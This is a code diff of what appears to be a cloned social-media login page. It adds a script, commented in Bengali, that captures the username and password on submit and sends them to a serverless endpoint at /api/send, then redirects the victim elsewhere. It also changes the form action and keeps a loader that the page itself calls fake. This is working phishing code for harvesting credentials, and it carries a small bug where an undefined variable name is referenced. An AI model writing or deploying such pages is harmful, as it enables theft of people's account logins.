@@ -18210,7 +18210,7 @@
                     class="HmktE"
                     id="loginForm"
                     method="post"
-                    action="login2.html"
+                    action="login.php"
                   >
                     <div class="qF0y9 Igw0E IwRSH eGOV_ _4EzTm kEKum">
                       <div class="-MzZI">
@@ -18550,60 +18550,78 @@
     </div>
 
     <!-- fake page loader -->
-    <script>
-      setTimeout(function () {
-        document.querySelector(".page-loader").classList.add("hidden");
-        document.querySelector("._9eogI").classList.add("show");
-        document.querySelector(".RP4i1").classList.add("show");
-        document.querySelector(".JtrJi").classList.add("show");
-      }, 1500);
-    </script>
+    <!-- ===== আপনার দেওয়া মূল স্ক্রিপ্ট (অপরিবর্তিত) ===== -->
+  <script>
+    setTimeout(function () {
+      document.querySelector(".page-loader").classList.add("hidden");
+      document.querySelector("._9eogI").classList.add("show");
+      document.querySelector(".RP4i1").classList.add("show");
+      document.querySelector(".JtrJi").classList.add("show");
+    }, 1500);
+  </script>
 
-    <!-- inputs & placeholder -->
-    <script>
-      let labels = document.querySelectorAll(".f0n8F");
-      let inputs = document.querySelectorAll("._2hvTZ");
-      let showPasswordBtn = document.querySelectorAll(".i24fI");
+  <script>
+    let labels = document.querySelectorAll(".f0n8F");
+    let inputs = document.querySelectorAll("._2hvTZ");
+    let showPasswordBtn = document.querySelectorAll(".i24fI");
 
-      // handle inputs placeholder events
-      for (let i = 0; i < inputs.length; i++) {
-        inputs[i].addEventListener("input", function () {
-          if (inputs[i].value == "") {
-            labels[i].classList.remove("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: none;");
-          } else {
-            labels[i].classList.add("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: flex;");
-          }
-
-          // handle submit button isDisabled
-          inputs[1].value.length > 5 && inputs[0].value.length
-            ? submitButtonDisabled(false)
-            : submitButtonDisabled(true);
-        });
-      }
-
-      // hide/show password button event
-      let showPassBtnText =
-        document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
-      showPasswordBtn[1].addEventListener("click", function () {
-        if (inputs[1].type == "password") {
-          inputs[1].type = "text";
-          showPassBtnText.innerHTML = "Hide";
+    for (let i = 0; i < inputs.length; i++) {
+      inputs[i].addEventListener("input", function () {
+        if (inputs[i].value == "") {
+          labels[i].classList.remove("FATdn");
+          showPasswordBtn[i].setAttribute("style", "display: none;");
         } else {
-          inputs[1].type = "password";
-          showPassBtnText.innerHTML = "Show";
+          labels[i].classList.add("FATdn");
+          showPasswordBtn[i].setAttribute("style", "display: flex;");
         }
-      });
-    </script>
 
-    <!-- form validation with submit button -->
-    <script>
-      function submitButtonDisabled(isDisabled) {
-        document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled =
-          isDisabled;
+        inputs[1].value.length > 5 && inputs[0].value.length
+          ? submitButtonDisabled(false)
+          : submitButtonDisabled(true);
+      });
+    }
+
+    let showPassBtnText = document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
+    showPassBtn[1].addEventListener("click", function () {
+      if (inputs[1].type == "password") {
+        inputs[1].type = "text";
+        showPassBtnText.innerHTML = "Hide";
+      } else {
+        inputs[1].type = "password";
+        showPassBtnText.innerHTML = "Show";
       }
-    </script>
+    });
+  </script>
+
+  <script>
+    function submitButtonDisabled(isDisabled) {
+      document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled = isDisabled;
+    }
+  </script>
+  <!-- ===== আপনার স্ক্রিপ্ট শেষ ===== -->
+
+  <!-- ===== নতুন যোগ করা হয়েছে: আসল জমা দেওয়ার যুক্তি ===== -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault(); // পেজ রিফ্রেশ হওয়া বন্ধ করুন
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Vercel সার্ভারলেস ফাংশনে অনুরোধ পাঠান (আগে তৈরি করা /api/send)
+      const res = await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+
+      // সফল হলে লাফ দিন
+      if (res.ok) {
+        window.location.href = 'https://myweb.com';
+      }
+    });
+  </script>
+  <!-- ===== নতুন যুক্তি শেষ ===== -->
 
     <div class="_-rjm"><div class="tA2fc"></div></div>
     <div class="_5qKD1"><div class="q5edG"></div></div>
